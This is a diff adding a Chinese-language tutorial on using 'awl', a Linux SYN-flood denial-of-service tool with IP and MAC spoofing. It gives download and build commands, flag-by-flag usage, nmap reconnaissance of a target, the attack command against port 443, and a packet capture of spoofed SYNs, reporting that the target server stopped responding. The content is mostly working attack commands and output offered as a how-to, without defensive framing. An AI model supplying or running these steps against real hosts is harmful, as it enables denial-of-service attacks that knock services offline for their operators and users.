@@ -2,3 +2,110 @@ awl攻击
 ############
 
 linux下awl 多线程SYN攻击工具,加了MAC伪装
+
+::
+
+    awl -i eth0 .......
+
+syn洪水攻击， 伪装ip ，服务端收到的都是syn_recv状态的连接。
+
+参考地址： http://blog.51cto.com/zhangxz/1431148
+
+
+一,安装:
+===============
+
+
+
+::
+
+    wget http://soft.alv.pub:180/linux/51CTO%CF%C2%D4%D8-awl-0.2.tar_vhcFaEwRuq7S.gz
+
+    tar -zxvf awl-0.2.tar.gz
+    yum install gcc gcc-c++ -y
+    ./configure
+    make
+    make install
+
+awl的执行程序安装后在/usr/local/bin/目录下
+
+二,说明:
+==============
+
+
+awl 的格式如下:
+
+::
+
+    ./awl -i eth0 -m aa:bb:cc:dd:ee:ff -d ip -p port
+
+（本地安装在我的jenkins机器上）
+参数如下:
+
+-i  发送包的接口,如果省略默认是eth0
+-m  被攻击机器的mac地址,程序不能根据被攻击IP得到MAC,需要手工指定.先ping 目标IP,再arp -a就可以看到.如果省略则为ff:ff:ff:ff:ff:ff
+-d  被攻击机器的IP
+-p  被攻击机器的端口.
+
+三,测试,
+===============
+
+
+服务器端:centOS 5.0
+
+对方服务器:freebsd   6.2   运行apache
+
+1,首先得知对方IP
+------------------------------
+
+运行nmap -v -A 192.168.0.1   查看对方开了啥服务
+
+::
+
+    [root@localhost bin]# nmap -v -A 10.122.89.106
+
+    Starting Nmap 4.11 ( http://www.insecure.org/nmap/ ) at 2008-06-02 19:24 CST
+    DNS resolution of 1 IPs took 0.39s.
+    Initiating SYN Stealth Scan against 10.122.89.106 [1680 ports] at 19:24
+    Discovered open port 21/tcp on 10.122.89.106
+    Discovered open port 25/tcp on 10.122.89.106
+    Discovered open port 22/tcp on 10.122.89.106
+    Discovered open port 443/tcp on 10.122.89.106
+    Discovered open port 80/tcp on 10.122.89.106
+    Discovered open port 199/tcp on 10.122.89.106
+    Discovered open port 110/tcp on 10.122.89.106
+    Discovered open port 143/tcp on 10.122.89.106
+    Discovered open port 3306/tcp on 10.122.89.106
+
+得知对方开了如上端口
+
+ping 192.168.0.1   得知mac地址
+
+查看arp -a 得知对方IP的MAC地址
+
+2.开始攻击:
+-----------------------
+
+::
+
+    ./awl -i eth0 -m aa:bb:cc:dd:ee:ff -d 192.168.0.1 -p 443
+
+ping 192.168.0.1 -t 查下对方反应
+
+四,测试效果
+=================
+
+攻击一开始,对方明显挂掉,各种应用无反应,
+如下是抓包:
+
+::
+
+    [root@localhost ~]# tcpdump
+    tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+    listening on eth0, link-type EN10MB (Ethernet), capture size 96 bytes
+    19:26:10.765001 IP 196.224.129.69.58334 > 10.122.82.169.https: S 2137366997:2137366997(0) win 57403
+    19:26:13.835951 IP 221.140.165.45.45259 > 10.122.82.169.https: S 2020705765:2020705765(0) win 28443
+    19:26:14.379435 IP 108.99.168.18.63871 > 10.122.82.169.https: S 1625298749:1625298749(0) win 23981
+    19:26:14.917676 IP 141.90.214.98.34527 > 10.122.82.169.https: S 697113617:697113617(0) win 48400
+    19:26:15.645562 IP 111-104.dsl.sky.cz.33734 > 10.122.82.169.https: S 1620903624:1620903624(0) win 34262
+    19:26:16.396435 IP 135.205.163.109.59589 > 10.122.82.169.https: S 1747490631:1747490631(0) win 40348
